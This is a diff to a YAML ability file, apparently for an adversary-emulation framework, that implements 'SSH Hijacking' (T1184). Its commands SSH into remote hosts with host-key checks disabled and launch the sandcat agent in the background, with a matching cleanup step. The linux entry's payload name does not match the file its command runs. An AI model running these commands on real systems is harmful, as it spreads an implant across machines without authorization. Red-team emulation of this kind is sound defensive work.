@@ -7,16 +7,18 @@
   technique:
     attack_id: T1184
     name: SSH Hijacking
-  executors:
+  platforms:
     darwin:
-      command: |
-        ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat-linux 1>/dev/null 2>/dev/null &'
-      cleanup: |
-        ssh -o ConnectTimeout=3 #{remote.ssh.cmd} '(pkill -f sandcat)'
-      payload: sandcat-linux
+      sh:
+        command: |
+          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go-linux 1>/dev/null 2>/dev/null &'
+        cleanup: |
+          ssh -o ConnectTimeout=3 #{remote.ssh.cmd} '(pkill -f sandcat)'
+        payload: sandcat.go-linux
     linux:
-      command: |
-        ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat-linux 1>/dev/null 2>/dev/null &'
-      cleanup: |
-        ssh -o ConnectTimeout=3 #{remote.ssh.cmd} '(pkill -f sandcat)'
-      payload: sandcat-linux
+      sh:
+        command: |
+          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go-linux 1>/dev/null 2>/dev/null &'
+        cleanup: |
+          ssh -o ConnectTimeout=3 #{remote.ssh.cmd} '(pkill -f sandcat)'
+        payload: sandcat.go
